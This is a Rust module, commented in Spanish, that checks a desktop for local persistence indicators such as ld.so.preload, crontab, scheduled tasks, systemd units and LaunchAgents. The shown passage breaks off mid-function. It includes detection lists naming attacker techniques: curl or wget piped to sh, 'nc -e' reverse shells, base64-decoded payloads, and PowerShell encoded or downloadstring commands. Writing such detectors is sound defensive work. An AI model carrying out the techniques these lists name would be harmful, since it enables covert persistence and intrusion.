//! Indicadores de compromiso: lo que hace un programa malo en ESTE sistema.
//!
//! QUÉ ES Y QUÉ NO ES, porque confundirlo sería lo peor que puede hacer esto:
//!
//! * **NO es un antivirus.** No mira dentro de los binarios, no tiene firmas de
//!   malware y no conoce las amenazas del día. Llamarlo antivirus sería mentir.
//! * **ES un chequeo de los sitios donde se esconde algo que se ejecuta solo**:
//!   los ficheros que el sistema lee al arrancar o al abrir la sesión, las tareas
//!   programadas, el gancho de bibliotecas (`ld.so.preload`), las llaves SSH
//!   autorizadas y los permisos de `~/.ssh`. Eso cubre la persistencia típica de
//!   un equipo de escritorio, que es lo que interesa a quien usa este panel.
//! * **TODO ES LOCAL.** No se sube nada a ningún sitio, no hay servicio externo y
//!   no hay reglas que se bajen solas. Si tienes `yara` instalado y reglas tuyas en
//!   `~/.config/machinograph/yara/`, se aplican TUS reglas, en tu equipo, y punto.
//!
//! Y una regla de estilo que aquí importa más que en ningún sitio: **cada hallazgo
//! lleva su prueba** (la línea, el permiso, la ruta). Un «puede haber malware» sin
//! nada debajo no se puede comprobar, y lo que no se puede comprobar no se cree.
//!
//! QUÉ SE MIRA EN CADA SISTEMA, porque no es lo mismo (hablar de «cron» en Windows
//! no significa nada y dejaba fuera lo que de verdad se ejecuta solo allí):
//!
//! | | Linux | macOS | Windows |
//! | --- | --- | --- | --- |
//! | Programadas | `crontab -l` | `crontab -l` | `schtasks /query /fo CSV /v` |
//! | Con tu sesión | `~/.config/systemd/user/*.service` | `~/Library/LaunchAgents` y `/Library/LaunchAgents` (`.plist`) | claves `Run` (las lista `plataforma::autoarranque`) |
//! | Arranque del shell | `.bashrc`, `.zshrc`, `config.fish`… | los mismos (zsh) | perfiles de PowerShell |
//! | Gancho de bibliotecas | `/etc/ld.so.preload` | no existe (aquí es `DYLD_INSERT_LIBRARIES`) | no existe (aquí es `AppInit_DLLs`) |
//!
//! Lo que no se puede comprobar se dice con su motivo y su veredicto `Desconocido`,
//! nunca con un «bien» que no se ha mirado.
use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Veredicto {
    /// No se encontró nada raro en lo que se mira.
    Ok,
    /// Algo que conviene mirar, pero que puede ser legítimo (una instalación
    /// propia, por ejemplo).
    Aviso,
    /// Esto no lo pone nadie sin querer.
    Problema,
    /// No se pudo comprobar (falta una herramienta, o no hay permiso).
    Desconocido,
}

#[derive(Debug, Clone, Serialize)]
pub struct Hallazgo {
    pub id: String,
    pub titulo: String,
    pub veredicto: Veredicto,
    /// Qué se ha encontrado, CON la prueba (la línea, el permiso, la ruta).
    pub detalle: String,
    /// Qué hacer, si hay algo que hacer.
    pub remedio: Option<String>,
    /// De dónde sale: el fichero, el comando o la ruta que se ha mirado.
    pub fuente: String,
}

impl Hallazgo {
    fn ok(id: &str, titulo: &str, detalle: String, fuente: &str) -> Self {
        Self {
            id: id.into(),
            titulo: titulo.into(),
            veredicto: Veredicto::Ok,
            detalle,
            remedio: None,
            fuente: fuente.into(),
        }
    }
    fn con(id: &str, titulo: &str, veredicto: Veredicto, detalle: String, fuente: &str) -> Self {
        Self {
            id: id.into(),
            titulo: titulo.into(),
            veredicto,
            detalle,
            remedio: None,
            fuente: fuente.into(),
        }
    }
    fn remedio(mut self, r: &str) -> Self {
        self.remedio = Some(r.into());
        self
    }
    fn peor(a: Veredicto, b: Veredicto) -> Veredicto {
        // El orden de gravedad, para poder resumir varios hallazgos en uno.
        fn rango(v: Veredicto) -> u8 {
            match v {
                Veredicto::Problema => 3,
                Veredicto::Aviso => 2,
                Veredicto::Desconocido => 1,
                Veredicto::Ok => 0,
            }
        }
        if rango(a) >= rango(b) {
            a
        } else {
            b
        }
    }
}

/// Patrones que en una línea de arranque (crontab, unidad de systemd, rc) no
/// pintan nada bien.
///
/// Lista CORTA y explícita: son las formas que usa la persistencia de verdad
/// (descargar y ejecutar, decodificar y ejecutar, y ejecutar desde temporales). No
/// se busca «cualquier cosa rara»: eso llenaría la pantalla de avisos que nadie
/// mira.
const SOSPECHOSOS: &[(&str, &str)] = &[
    ("| sh", "descarga algo y lo ejecuta directamente"),
    ("|sh", "descarga algo y lo ejecuta directamente"),
    ("| bash", "descarga algo y lo ejecuta directamente"),
    ("|bash", "descarga algo y lo ejecuta directamente"),
    ("base64 -d", "decodifica algo (posible carga cifrada)"),
    ("base64 --decode", "decodifica algo (posible carga cifrada)"),
    ("/dev/shm", "usa memoria compartida, que se borra al reiniciar"),
    ("/tmp/", "ejecuta desde temporales"),
    ("curl ", "descarga algo al arrancar"),
    ("wget ", "descarga algo al arrancar"),
    ("eval $(", "ejecuta lo que devuelva otro comando"),
    ("python -c", "ejecuta código en línea"),
    ("nc -e", "abre una shell por red"),
    ("socat ", "abre una conexión"),
];

/// Los mismos patrones, pero para una línea de comandos de Windows: allí la
/// persistencia no usa `curl | sh`, usa PowerShell con el comando codificado y
/// utilidades del propio sistema para bajar y ejecutar sin escribir nada en disco.
///
/// Lista CORTA por la misma razón que la de arriba: cada patrón es una forma que
/// usa la persistencia de verdad, no «cualquier cosa rara».
const SOSPECHOSOS_WINDOWS: &[(&str, &str)] = &[
    ("-enc ", "ejecuta un comando codificado en base64"),
    ("-encodedcommand", "ejecuta un comando codificado en base64"),
    ("frombase64string", "decodifica algo (posible carga cifrada)"),
    ("downloadstring", "descarga algo y lo ejecuta en memoria"),
    ("downloadfile", "descarga algo al arrancar"),
    ("invoke-webrequest", "descarga algo al arrancar"),
    ("iex(", "ejecuta lo que devuelva otro comando"),
    (" iex ", "ejecuta lo que devuelva otro comando"),
    ("invoke-expression", "ejecuta lo que devuelva otro comando"),
    ("mshta ", "ejecuta HTML o script a través de mshta"),
    ("rundll32 ", "ejecuta una biblioteca con rundll32"),
    ("regsvr32 ", "registra o ejecuta una biblioteca"),
    ("certutil ", "usa certutil (puede descargar y decodificar ficheros)"),
    ("wscript ", "ejecuta un script de Windows"),
    ("cscript ", "ejecuta un script de Windows"),
];

/// De dónde NO debería arrancar nada, porque es donde nadie instala nada. Cada
/// sistema los suyos: en Linux valen `/tmp` y la memoria compartida; en macOS,
/// `/private/tmp` y `/var/folders` (que es donde macOS pone los temporales de
/// verdad); en Windows, los temporales del perfil y `Users\Public`, que es
/// escribible por cualquiera.
const RUTAS_SOSPECHOSAS_UNIX: &[&str] = &["/tmp/", "/dev/shm", "/descargas/", "/downloads/", "/var/tmp/"];
const RUTAS_SOSPECHOSAS_MACOS: &[&str] = &[
    "/tmp/",
    "/private/tmp/",
    "/var/folders/",
    "/private/var/folders/",
    "/descargas/",
    "/downloads/",
    "/users/shared/",
    "/volumes/",
];
const RUTAS_SOSPECHOSAS_WINDOWS: &[&str] = &[
    "\\temp\\",
    "/temp/",
    "%temp%",
    "\\downloads\\",
    "/downloads/",
    "\\descargas\\",
    "/descargas/",
    "\\users\\public\\",
    "/users/public/",
    "\\appdata\\local\\temp\\",
];

/// ¿Esta línea tiene algo sospechoso? Devuelve el motivo, o `None`.
///
/// Los comentarios se ignoran: una línea que empieza por `#` es una nota, y marcar
/// como problema una nota con la palabra «curl» sería ruido (y el ruido hace que
/// nadie mire los avisos de verdad).
pub fn motivo_sospechoso(linea: &str) -> Option<&'static str> {
    let l = linea.trim().to_lowercase();
    if l.starts_with('#') {
        return None;
    }
    SOSPECHOSOS.iter().find(|(p, _)| l.contains(p)).map(|(_, m)| *m)
}

/// ¿Esta línea de comandos de Windows tiene algo sospechoso? Igual que la de
/// arriba pero con los patrones de ese sistema (`curl` y `wget` también existen
/// en Windows 10 en adelante, así que se miran las dos listas).
pub fn motivo_sospechoso_windows(linea: &str) -> Option<&'static str> {
    motivo_sospechoso(linea).or_else(|| {
        let l = linea.trim().to_lowercase();
        SOSPECHOSOS_WINDOWS.iter().find(|(p, _)| l.contains(p)).map(|(_, m)| *m)
    })
}

/// Las rutas de las que no debería arrancar nada en el sistema indicado.
fn patrones_de_ruta(so: &str) -> &'static [&'static str] {
    match so {
        "windows" => RUTAS_SOSPECHOSAS_WINDOWS,
        "macos" => RUTAS_SOSPECHOSAS_MACOS,
        _ => RUTAS_SOSPECHOSAS_UNIX,
    }
}

/// ¿Este comando apunta a una carpeta donde nadie instala nada (descargas,
/// temporales o una carpeta compartida y escribible)?
///
/// Se pasa el sistema explícitamente para poder probar los patrones de macOS y de
/// Windows desde Linux; el resto del módulo llama a `ruta_sospechosa`.
pub fn ruta_sospechosa_en(so: &str, ejecutable: &str) -> bool {
    let e = ejecutable.to_lowercase();
    patrones_de_ruta(so).iter().any(|p| e.contains(p))
}

fn ruta_sospechosa(ejecutable: &str) -> bool {
    ruta_sospechosa_en(crate::plataforma::so(), ejecutable)
}

/// Revisa lo que se ejecuta solo en este equipo. Nunca lanza: lo que no se puede
/// mirar sale como `Desconocido` con su motivo.
pub fn revisar() -> Vec<Hallazgo> {
    let mut v = Vec::new();
    v.push(revisar_preload());
    v.push(revisar_programadas());
    v.push(revisar_arranque_de_usuario());
    v.push(revisar_autostart());
    v.push(revisar_rc());
    v.push(revisar_ssh_permisos());
    v.push(revisar_ssh_llaves());
    v.push(revisar_yara());
    v
}

/* ── Lo que el sistema carga antes que nada ───────────────────────────────── */

/// `/etc/ld.so.preload`: si tiene algo, ese fichero se carga en TODOS los
/// programas. Es donde se engancha una biblioteca maliciosa, y no lo pone nadie
/// sin querer.
///
/// Esto es SOLO de Linux: macOS y Windows tienen ganchos parecidos
/// (`DYLD_INSERT_LIBRARIES` y `AppInit_DLLs`), pero no viven en un fichero que se
/// pueda leer igual, así que allí se dice que no aplica (ver abajo) en vez de
/// enseñar un «bien» de algo que no se ha mirado.
#[cfg(target_os = "linux")]
fn revisar_preload() -> Hallazgo {
    let ruta = "/etc/ld.so.preload";
    if !std::path::Path::new(ruta).exists() {
        return Hallazgo::ok(
            "ld-preload",
            "Gancho de bibliotecas (ld.so.preload)",
            "No existe, que es lo normal: no hay ninguna biblioteca forzada.".into(),
            ruta,
        );
    }
    match std::fs::read_to_string(ruta) {
        Ok(t) if t.trim().is_empty() => Hallazgo::ok(
            "ld-preload",
            "Gancho de bibliotecas (ld.so.preload)",
            "Existe pero está vacío: no fuerza ninguna biblioteca.".into(),
            ruta,
        ),
        Ok(t) => Hallazgo::con(
            "ld-preload",
            "Gancho de bibliotecas (ld.so.preload)",
            Veredicto::Problema,
            format!("Fuerza estas bibliotecas en TODOS los programas: {}", t.trim()),
            ruta,
        )
        .remedio("Míralo antes de tocar nada (`cat /etc/ld.so.preload`). Si no lo has puesto tú, quítalo como root y revisa cómo llegó ahí."),
        Err(e) => Hallazgo::con(
            "ld-preload",
            "Gancho de bibliotecas (ld.so.preload)",
            Veredicto::Desconocido,
            format!("Existe, pero no se pudo leer ({e}). Hace falta root para verlo."),
            ruta,
        ),
    }
}

/// En macOS y Windows `ld.so.preload` no existe: es el gancho de bibliotecas de
/// Linux. Se dice con su motivo en vez de decir «no existe, todo bien», porque no
/// haber mirado el equivalente de cada uno es exactamente lo que este veredicto
/// existe para contar.
#[cfg(not(target_os = "linux"))]
fn revisar_preload() -> Hallazgo {
    let equivalente = if cfg!(target_os = "macos") {
        "`DYLD_INSERT_LIBRARIES`, que se pasa por el entorno de la sesión"
    } else {
        "`AppInit_DLLs`, que vive en el registro de Windows"
    };
    Hallazgo::con(
        "ld-preload",
        "Gancho de bibliotecas (ld.so.preload)",
        Veredicto::Desconocido,
        format!(
            "`/etc/ld.so.preload` no existe en {}: ese gancho es de Linux. El equivalente aquí es {equivalente}, y esta comprobación no lo mira porque no hay un fichero que leer. Lo que sí se mira en este sistema es lo que se ejecuta solo (tareas programadas y arranque de la sesión).",
            crate::plataforma::nombre_so()
        ),
        "/etc/ld.so.preload",
    )
}

/* ── Tareas programadas ───────────────────────────────────────────────────── */

/// Las tareas programadas de este sistema: `cron` en Linux y macOS, el
/// Programador de tareas (`schtasks`) en Windows. Es el mecanismo clásico de
/// persistencia y el que más se usa para repetir algo cada cierto tiempo.
#[cfg(not(target_os = "windows"))]
fn revisar_programadas() -> Hallazgo {
    revisar_crontab()
}

#[cfg(target_os = "windows")]
fn revisar_programadas() -> Hallazgo {
    revisar_schtasks()
}

/// El `cron` del usuario: `crontab -l`. En macOS existe igual (es BSD cron) y el
/// formato de las líneas es el mismo, así que vale el mismo lector.
#[cfg(not(target_os = "windows"))]
fn revisar_crontab() -> Hallazgo {
    let fuente = "crontab -l";
    match crate::proceso::ejecutar("crontab", &["-l".into()], &[], std::time::Duration::from_secs(5)) {
        Ok(s) => {
            let texto = String::from_utf8_lossy(&s.stdout);
            let lineas = parsear_crontab(&texto);
            if lineas.is_empty() {
                return Hallazgo::ok("cron-usuario", "Tareas programadas tuyas", "No tienes ninguna tarea programada.".into(), fuente);
            }
            let malas: Vec<&String> = lineas.iter().filter(|l| motivo_sospechoso(l).is_some()).collect();
            if malas.is_empty() {
                return Hallazgo::ok(
                    "cron-usuario",
                    "Tareas programadas tuyas",
                    format!("{} tarea(s), ninguna con pinta de descargar y ejecutar.", lineas.len()),
                    fuente,
                );
            }
            let motivo = motivo_sospechoso(malas[0]).unwrap_or("patrón sospechoso");
            Hallazgo::con(
                "cron-usuario",
                "Tareas programadas tuyas",
                Veredicto::Problema,
                format!("{} tarea(s) con pinta de {motivo}: {}", malas.len(), malas[0].trim()),
                fuente,
            )
            .remedio("Míralas con `crontab -l` y quita lo que no hayas puesto tú (`crontab -e`).")
        }
        // `crontab -l` devuelve error cuando no hay crontab: eso NO es un fallo.
        Err(_) => Hallazgo::ok(
            "cron-usuario",
            "Tareas programadas tuyas",
            "No tienes ninguna tarea programada (o no hay `crontab` en este sistema).".into(),
            fuente,
        ),
    }
}

/// Las líneas que de verdad son tareas (sin comentarios ni cabeceras de variables).
#[cfg_attr(target_os = "windows", allow(dead_code))]
pub fn parsear_crontab(texto: &str) -> Vec<String> {
    texto
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#') && !l.contains('='))
        .map(str::to_string)
        .collect()
}

/// Una tarea programada de Windows, con lo justo para poder juzgarla.
#[derive(Debug, Clone, PartialEq)]
// Solo lo usa Windows (aquí se compila y se prueba): en Linux no hay quien lo
// llame, así que el aviso de código muerto se silencia A CONCIENCIA, como en
// `plataforma::autoarranque`.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
pub struct TareaProgramada {
    pub nombre: String,
    /// La línea de comandos que ejecuta.
    pub ejecutar: String,
    /// Cuándo se ejecuta (la columna `Schedule`).
    pub programacion: String,
    /// Si está activada: una tarea desactivada no se ejecuta, así que no es
    /// persistencia y no se señala.
    pub activa: bool,
}

/// Los campos de una línea CSV con comillas, que es la forma que usa `schtasks`:
/// campos entre comillas dobles, comas dentro de las comillas y `""` para una
/// comilla literal.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
fn campos_csv(linea: &str) -> Vec<String> {
    let mut campos: Vec<String> = Vec::new();
    let mut actual = String::new();
    let mut entre_comillas = false;
    let mut letras = linea.chars().peekable();
    while let Some(c) = letras.next() {
        match c {
            '"' if entre_comillas => {
                if letras.peek() == Some(&'"') {
                    actual.push('"');
                    letras.next();
                } else {
                    entre_comillas = false;
                }
            }
            '"' => entre_comillas = true,
            ',' if !entre_comillas => campos.push(std::mem::take(&mut actual)),
            c => actual.push(c),
        }
    }
    campos.push(actual);
    campos
}

/// Parser PURO de `schtasks /query /fo CSV /v`.
///
/// El formato es CSV de verdad y la primera fila trae los NOMBRES de las columnas,
/// así que se buscan por nombre y no por posición: el número y el orden de las
/// columnas cambia entre versiones de Windows, y leer la columna equivocada
/// señalaría la tarea que no es.
///
/// Se conocen los nombres en inglés (`TaskName`, `Task To Run`, `Schedule`,
/// `Scheduled Task State`). En un Windows que no esté en inglés `schtasks`
/// traduce esas cabeceras: entonces esto devuelve `Err` CON la cabecera que vio, y
/// quien llama lo cuenta como «sin comprobar» en vez de adivinar por posición.
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
pub fn parsear_schtasks_csv(texto: &str) -> Result<Vec<TareaProgramada>, String> {
    let mut lineas = texto.lines().filter(|l| !l.trim().is_empty());
    let cabecera = lineas.next().ok_or_else(|| "la salida estaba vacía".to_string())?;
    let columnas = campos_csv(cabecera);
    let buscar = |nombres: &[&str]| {
        columnas
            .iter()
            .position(|c| nombres.iter().any(|n| c.trim().eq_ignore_ascii_case(n)))
    };
    let col_nombre = buscar(&["TaskName"])
        .ok_or_else(|| format!("no encuentro la columna `TaskName`; la cabecera fue: {}", cabecera.trim()))?;
    let col_ejecutar = buscar(&["Task To Run"])
        .ok_or_else(|| format!("no encuentro la columna `Task To Run`; la cabecera fue: {}", cabecera.trim()))?;
    let col_programa = buscar(&["Schedule"]);
    let col_estado = buscar(&["Scheduled Task State"]);

    let mut tareas: Vec<TareaProgramada> = Vec::new();
    for linea in lineas {
        let campos = campos_csv(linea);
        let nombre = campos.get(col_nombre).cloned().unwrap_or_default();
        if nombre.trim().is_empty() {
            continue;
        }
        // Si no hay columna de estado, se da por activa: mirar de más es mejor que
        // saltarse una tarea que sí se ejecuta.
        let activa = col_estado
            .and_then(|i| campos.get(i))
            .map(|e| !e.trim().eq_ignore_ascii_case("Disabled"))
            .unwrap_or(true);
        tareas.push(TareaProgramada {
            nombre: nombre.trim().to_string(),
            ejecutar: campos.get(col_ejecutar).cloned().unwrap_or_default().trim().to_string(),
            programacion: col_programa
                .and_then(|i| campos.get(i))
                .cloned()
                .unwrap_or_default()
                .trim()
                .to_string(),
            activa,
        });
    }
    Ok(tareas)
}

/// El Programador de tareas de Windows. `schtasks` es el comando del sistema (no
/// hace falta la API COM) y `/fo CSV /v` da la línea de comandos completa de cada
/// tarea, que es lo que hay que mirar.
#[cfg(target_os = "windows")]
fn revisar_schtasks() -> Hallazgo {
    let id = "tareas-programadas";
    let titulo = "Tareas programadas";
    let fuente = "schtasks /query /fo CSV /v";
    let args: Vec<String> = ["/query", "/fo", "CSV", "/v"].iter().map(|s| (*s).to_string()).collect();
    let salida = match crate::proceso::ejecutar("schtasks", &args, &[], std::time::Duration::from_secs(30)) {
        Ok(s) => s,
        Err(e) => {
            return Hallazgo::con(
                id,
                titulo,
                Veredicto::Desconocido,
                format!("No se pudo preguntar al Programador de tareas ({e})."),
                fuente,
            )
        }
    };
    if !salida.status.success() {
        return Hallazgo::con(
            id,
            titulo,
            Veredicto::Desconocido,
            format!("`schtasks` falló: {}", String::from_utf8_lossy(&salida.stderr).trim()),
            fuente,
        );
    }
    let texto = String::from_utf8_lossy(&salida.stdout);
    let tareas = match parsear_schtasks_csv(&texto) {
        Ok(t) => t,
        Err(motivo) => {
            return Hallazgo::con(
                id,
                titulo,
                Veredicto::Desconocido,
                format!("Se pudo consultar, pero no se entendió la respuesta: {motivo}"),
                fuente,
            )
        }
    };
    let mut malas: Vec<String> = Vec::new();
    for t in &tareas {
        if !t.activa {
            continue;
        }
        let motivo = motivo_sospechoso_windows(&t.ejecutar).or_else(|| {
            if ruta_sospechosa(&t.ejecutar) {
                Some("ejecuta algo desde una carpeta de descargas o temporales")
            } else {
                None
            }
        });
        let Some(motivo) = motivo else { continue };
        let cuando = if t.programacion.is_empty() {
            String::new()
        } else {
            format!(", {}", t.programacion)
        };
        malas.push(format!("{}{cuando} ({motivo}): {}", t.nombre, t.ejecutar));
    }
    if malas.is_empty() {
        return Hallazgo::ok(
            id,
            titulo,
            format!("{} tarea(s) programadas, ninguna con algo raro en lo que ejecuta.", tareas.len()),
            fuente,
        );
    }
    Hallazgo::con(
        id,
        titulo,
        Veredicto::Problema,
        format!("{} tarea(s) con algo que no pinta bien: {}", malas.len(), malas[0]),
        fuente,
    )
    .remedio("Míralas en el Programador de tareas (`taskschd.msc`). Una tarea que no hayas creado tú y que lance PowerShell con el comando codificado, o algo desde una carpeta temporal, es persistencia típica: desactívala y averigua de dónde salió.")
}

/// Lo que arranca con tu sesión y no es un simple «programa de inicio»: unidades
/// de systemd en Linux, agentes de launchd en macOS. Cada sistema tiene lo suyo y
/// ninguno se finge con el de otro.
#[cfg(target_os = "linux")]
fn revisar_arranque_de_usuario() -> Hallazgo {
    unidades_systemd()
}

#[cfg(target_os = "macos")]
fn revisar_arranque_de_usuario() -> Hallazgo {
    agentes_launchd()
}

#[cfg(target_os = "windows")]
fn revisar_arranque_de_usuario() -> Hallazgo {
    servicios_windows()
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn revisar_arranque_de_usuario() -> Hallazgo {
    Hallazgo::con(
        "arranque-usuario",
        "Arranque de usuario",
        Veredicto::Desconocido,
        format!(
            "{} no es Linux, macOS ni Windows: no se sabe qué se ejecuta solo aquí, así que no se comprueba.",
            crate::plataforma::nombre_so()
        ),
        "—",
    )
}

/// Los servicios de usuario (`~/.config/systemd/user/*.service`): la otra forma de
/// que algo se ejecute solo, y más común que el cron en un escritorio moderno.
#[cfg(target_os = "linux")]
fn unidades_systemd() -> Hallazgo {
    let dir = crate::plataforma::rutas().config.join("systemd").join("user");
    let fuente = dir.to_string_lossy().to_string();
    let Ok(it) = std::fs::read_dir(&dir) else {
        return Hallazgo::ok(
            "systemd-usuario",
            "Servicios de usuario",
            "No hay servicios de usuario en este equipo.".into(),
            &fuente,
        );
    };
    let mut total = 0usize;
    let mut malos: Vec<String> = Vec::new();
    for e in it.flatten() {
        let p = e.path();
        if p.extension().map(|x| x != "service").unwrap_or(true) {
            continue;
        }
        let Ok(t) = std::fs::read_to_string(&p) else { continue };
        total += 1;
        for linea in t.lines() {
            let l = linea.trim();
            if !l.starts_with("ExecStart") {
                continue;
            }
            if let Some(motivo) = motivo_sospechoso(l) {
                malos.push(format!("{} ({motivo})", l.trim_start_matches("ExecStart=").trim()));
            }
        }
    }
    if malos.is_empty() {
        return Hallazgo::ok(
            "systemd-usuario",
            "Servicios de usuario",
            format!("{total} servicio(s) tuyos, ninguno con pinta de descargar y ejecutar."),
            &fuente,
        );
    }
    Hallazgo::con(
        "systemd-usuario",
        "Servicios de usuario",
        Veredicto::Problema,
        format!("{} servicio(s) con algo raro en su ExecStart: {}", malos.len(), malos[0]),
        &fuente,
    )
    .remedio("Míralos con `systemctl --user list-units --type=service` y con `systemctl --user cat <nombre>`.")
}

/* ── macOS: lo que launchd arranca ────────────────────────────────────────── */

/// Un trabajo cargado en launchd, tal como lo imprime `launchctl list`.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub struct TrabajoLaunchd {
    /// El PID si está corriendo ahora mismo; `None` si no (el `-` de la salida).
    pub pid: Option<u32>,
    /// El último estado de salida (si es negativo, lo mató esa señal).
    pub estado: Option<i32>,
    pub etiqueta: String,
}

/// Parser PURO de `launchctl list`, que imprime TRES columnas: el PID (o `-` si no
/// está corriendo), el último estado de salida y la etiqueta del trabajo (man
/// launchctl: «list ... in three columns»).
///
/// Se acepta con y sin la cabecera `PID Status Label` (hay versiones de macOS que
/// la imprimen y otras que no): una fila que no empiece por un número o por `-` se
/// descarta, así que la cabecera no se cuela como si fuera un trabajo.
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn parsear_launchctl_list(texto: &str) -> Vec<TrabajoLaunchd> {
    texto
        .lines()
        .filter_map(|l| {
            let mut campos = l.split_whitespace();
            let pid = campos.next()?;
            let estado = campos.next()?;
            let etiqueta = campos.next()?;
            // Una etiqueta no lleva espacios: si sobra algo, la línea no es del
            // formato y no se interpreta.
            if campos.next().is_some() {
                return None;
            }
            let pid = if pid == "-" { None } else { Some(pid.parse::<u32>().ok()?) };
            Some(TrabajoLaunchd {
                pid,
                estado: Some(estado.parse::<i32>().ok()?),
                etiqueta: etiqueta.to_string(),
            })
        })
        .collect()
}

/// Un LaunchAgent leído de su `.plist`.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub struct AgenteLaunchd {
    pub etiqueta: Option<String>,
    /// El programa y sus argumentos, EN ORDEN. Esto es lo que hay que mirar: el
    /// primer argumento puede ser un `/bin/sh` de lo más inocente y la maldad ir
    /// detrás, así que mirar solo el programa no valdría.
    pub argumentos: Vec<String>,
    /// Si pide arrancar al cargarse (`RunAtLoad`).
    pub run_at_load: bool,
    /// Si pide mantenerse vivo (`KeepAlive`): eso también es arrancar solo.
    pub keep_alive: bool,
}

/// Parser PURO del JSON que devuelve `plutil -convert json -o -` para un `.plist`.
///
/// Se usa `plutil` (la herramienta del propio macOS) porque un `.plist` puede ser
/// XML o binario y así se leen los dos, sin meter aquí un lector de plists.
#[cfg_attr(not(target_os = "macos"), allow(dead_code))]
pub fn parsear_plist_agente(json: &str) -> Option<AgenteLaunchd> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    let obj = v.as_object()?;
    // Los argumentos vienen en `ProgramArguments` (lo normal) o en `Program` (una
    // sola cadena): valen los dos, porque un agente escrito a mano puede usar
    // cualquiera de ellos.
    let mut argumentos: Vec<String> = obj
        .get("ProgramArguments")
        .and_then(|a| a.as_array())
        .map(|a| a.iter().filter_map(|x| x.as_str()).map(str::to_string).collect())
        .unwrap_or_default();
    if argumentos.is_empty() {
        if let Some(p) = obj.get("Program").and_then(|p| p.as_str()) {
            argumentos.push(p.to_string());
        }
    }
    let keep_alive = match obj.get("KeepAlive") {
        // `KeepAlive` puede ser un booleano o un diccionario de condiciones; un
        // diccionario significa «mantenlo vivo cuando pase esto», así que cuenta
        // como que arranca solo.
        Some(x) => x.as_bool().unwrap_or_else(|| x.is_object()),
        None => false,
    };
    Some(AgenteLaunchd {
        etiqueta: obj.get("Label").and_then(|l| l.as_str()).map(str::to_string),
        argumentos,
        run_at_load: obj.get("RunAtLoad").and_then(|b| b.as_bool()).unwrap_or(false),
        keep_alive,
    })
}

/// Dónde viven los agentes de launchd que puede haber puesto alguien.
///
/// Se miran las DOS carpetas de agentes (la del usuario y la del administrador),
/// pero no `/System/Library/LaunchAgents`: lo que viene con macOS está protegido
/// por SIP, y lo que interesa aquí es lo que se ha añadido después.
#[cfg(target_os = "macos")]
fn dirs_agentes() -> Vec<(std::path::PathBuf, &'static str)> {
    let mut v: Vec<(std::path::PathBuf, &'static str)> = Vec::new();
    if let Some(home) = dirs::home_dir() {
        v.push((home.join("Library").join("LaunchAgents"), "usuario"));
    }
    v.push((std::path::PathBuf::from("/Library/LaunchAgents"), "administrador"));
    v
}

/// Qué trabajos tiene launchd cargados AHORA MISMO, según `launchctl list`. Es la
/// prueba de que un agente que está en disco además está activo.
#[cfg(target_os = "macos")]
fn trabajos_cargados() -> Option<Vec<TrabajoLaunchd>> {
    let s = crate::proceso::ejecutar(
        "launchctl",
        &["list".to_string()],
        &[],
        std::time::Duration::from_secs(10),
    )
    .ok()?;
    if !s.status.success() {
        return None;
    }
    Some(parsear_launchctl_list(&String::from_utf8_lossy(&s.stdout)))
}

/// Los agentes de launchd que hay en disco, con su prueba: si el comando del
/// agente descarga y ejecuta (o sale de una carpeta de temporales o descargas), se
/// enseña la línea entera y, si launchd lo tiene cargado, también eso.
///
/// No se reutiliza `plataforma::autoarranque::listar()` aquí a propósito: esa lista
/// (que sí se usa para el arranque de la sesión, en `revisar_autostart`) da solo el
/// PRIMER argumento del programa, y en un agente lo que importa es la línea
/// completa: un `/bin/sh` de primer argumento no dice nada y el `curl … | sh` va
/// detrás. La lista de trabajos cargados sí se pide al sistema (`launchctl list`),
/// que es lo que no se puede saber leyendo ficheros.
#[cfg(target_os = "macos")]
fn agentes_launchd() -> Hallazgo {
    let id = "launchd-agentes";
    let titulo = "Agentes de arranque (LaunchAgents)";
    let dirs = dirs_agentes();
    let fuente = dirs
        .iter()
        .map(|(d, origen)| format!("{} ({origen})", d.display()))
        .collect::<Vec<_>>()
        .join("; ");
    let cargados = trabajos_cargados();
    let mut total = 0usize;
    let mut sin_leer = 0usize;
    let mut graves: Vec<String> = Vec::new();
    let mut leves: Vec<String> = Vec::new();
    for (dir, _origen) in &dirs {
        let Ok(it) = std::fs::read_dir(dir) else { continue };
        let mut ficheros: Vec<std::path::PathBuf> = it
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.extension().map(|x| x == "plist").unwrap_or(false))
            .collect();
        ficheros.sort();
        for f in ficheros {
            total += 1;
            let json = crate::proceso::ejecutar(
                "plutil",
                &[
                    "-convert".into(),
                    "json".into(),
                    "-o".into(),
                    "-".into(),
                    f.to_string_lossy().to_string(),
                ],
                &[],
                std::time::Duration::from_secs(5),
            )
            .ok()
            .filter(|o| o.status.success())
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string());
            let Some(agente) = json.as_deref().and_then(parsear_plist_agente) else {
                // Un plist que no se puede leer se CUENTA: si no, un fichero
                // ilegible pasaría por «no hay nada» y el «bien» sería mentira.
                sin_leer += 1;
                continue;
            };
            let linea = agente.argumentos.join(" ");
            if linea.is_empty() {
                continue;
            }
            let grave = motivo_sospechoso(&linea);
            let motivo = grave.or_else(|| {
                if ruta_sospechosa(&linea) {
                    Some("ejecuta algo desde una carpeta de descargas o temporales")
                } else {
                    None
                }
            });
            let Some(motivo) = motivo else { continue };
            let etiqueta = agente
                .etiqueta
                .clone()
                .unwrap_or_else(|| f.file_stem().map(|s| s.to_string_lossy().to_string()).unwrap_or_default());
            let arranque = if agente.run_at_load {
                " — pide arrancar al cargarse (RunAtLoad)"
            } else if agente.keep_alive {
                " — pide mantenerse vivo (KeepAlive)"
            } else {
                ""
            };
            let cargado = cargados
                .as_ref()
                .and_then(|c| c.iter().find(|t| Some(t.etiqueta.as_str()) == agente.etiqueta.as_deref()))
                .map(|t| match t.pid {
                    Some(p) => format!(" — cargado ahora mismo por launchd (PID {p})"),
                    None => match t.estado {
